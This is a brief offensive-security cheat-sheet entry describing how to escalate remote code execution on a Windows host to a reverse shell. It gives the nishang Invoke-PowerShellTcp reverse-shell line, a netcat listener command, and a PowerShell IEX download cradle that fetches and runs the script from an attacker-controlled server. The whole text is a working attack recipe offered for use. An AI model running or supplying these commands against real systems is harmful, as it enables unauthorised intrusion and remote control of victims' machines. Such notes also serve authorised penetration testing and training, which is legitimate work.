##### If you have remote code execution but no shell
```
# Use nishang to invoke powershell and get reverse shell. Host Invoke-PowerShell script.
# Open the script and add at the bottom 
Invoke-PowerShellTCP -Reverse -IPAddress <attacking-ip> -Port <attacking-port>

# Use your RCE to download the script through powershell
# For 64-bit use C:\Windows\SysNative, for 32-bit use C:\Windows\System32
# Ensure your start your listener nc -lvp <attacking-port>
C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://<ip>/Invoke-PowerShellTcp.ps1')

```
